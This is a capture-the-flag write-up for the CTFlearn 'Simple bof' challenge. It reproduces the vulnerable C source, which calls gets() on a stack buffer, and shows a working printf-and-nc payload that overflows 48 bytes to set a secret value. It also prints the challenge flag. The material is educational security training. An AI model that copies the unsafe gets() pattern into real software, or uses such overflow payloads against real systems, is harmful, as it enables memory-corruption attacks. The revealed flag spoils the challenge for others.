# Simple bof
## Description
Want to learn the hacker's secret? Try to smash this buffer!

You need guidance? Look no further than to [Mr. Liveoverflow](https://old.liveoverflow.com/binary_hacking/protostar/stack0.html). He puts out nice videos you should look if you haven't already

`nc thekidofarcrania.com 35235`
## Hints
(None)
## Solution
1. The `gets` vulnerability is pointed out in the source code.
```c
void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}
```
2. Run the program and it's obvious we must overflow 48 bytes to then subsequently input the correct secret.
```console
% nc thekidofarcrania.com 35235

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xffa86538 | 00 00 00 00 00 00 00 00 |
0xffa86540 | 00 00 00 00 00 00 00 00 |
0xffa86548 | 00 00 00 00 00 00 00 00 |
0xffa86550 | 00 00 00 00 00 00 00 00 |
0xffa86558 | ff ff ff ff ff ff ff ff |
0xffa86560 | ff ff ff ff ff ff ff ff |
0xffa86568 | ef be ad de 00 ff ff ff |
0xffa86570 | c0 c5 ed f7 84 af 5c 56 |
0xffa86578 | 88 65 a8 ff 11 8b 5c 56 |
0xffa86580 | a0 65 a8 ff 00 00 00 00 |

Input some text:
```
3. The correct secret is `0x67616c66`.
```console
% printf "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffff\x66\x6c\x61\x67\n" | nc thekidofarcrania.com 35235

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xfff94998 | 00 00 00 00 00 00 00 00 |
0xfff949a0 | 00 00 00 00 00 00 00 00 |
0xfff949a8 | 00 00 00 00 00 00 00 00 |
0xfff949b0 | 00 00 00 00 00 00 00 00 |
0xfff949b8 | ff ff ff ff ff ff ff ff |
0xfff949c0 | ff ff ff ff ff ff ff ff |
0xfff949c8 | ef be ad de 00 ff ff ff |
0xfff949d0 | c0 b5 f2 f7 84 5f 5b 56 |
0xfff949d8 | e8 49 f9 ff 11 3b 5b 56 |
0xfff949e0 | 00 4a f9 ff 00 00 00 00 |

Input some text: 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xfff94998 | 61 61 61 61 61 61 61 61 |
0xfff949a0 | 62 62 62 62 62 62 62 62 |
0xfff949a8 | 63 63 63 63 63 63 63 63 |
0xfff949b0 | 64 64 64 64 64 64 64 64 |
0xfff949b8 | 65 65 65 65 65 65 65 65 |
0xfff949c0 | 66 66 66 66 66 66 66 66 |
0xfff949c8 | 66 6c 61 67 00 ff ff ff |
0xfff949d0 | c0 b5 f2 f7 84 5f 5b 56 |
0xfff949d8 | e8 49 f9 ff 11 3b 5b 56 |
0xfff949e0 | 00 4a f9 ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
```
